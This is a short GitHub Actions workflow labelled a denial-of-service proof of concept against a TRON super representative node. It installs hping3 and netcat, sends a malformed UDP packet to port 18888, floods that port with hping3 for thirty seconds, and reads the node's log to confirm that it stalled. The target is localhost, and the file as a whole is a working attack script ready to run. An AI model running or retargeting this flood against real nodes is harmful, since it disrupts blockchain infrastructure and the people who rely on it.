name: TRON SR DoS PoC
on: [workflow_dispatch]  # Manual trigger
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Flood SR
      run: |
        sudo apt install hping3 netcat
        printf '\x12\x03BAD\x10\x01' | nc -u 127.0.0.1 18888
        sudo hping3 -2 --flood -p 18888 --data 120342030244410101 127.0.0.1 &
        sleep 30 && killall hping3
    - name: Logs
      run: cat /var/log/tron-sr.log || echo "SR stalled ✓"
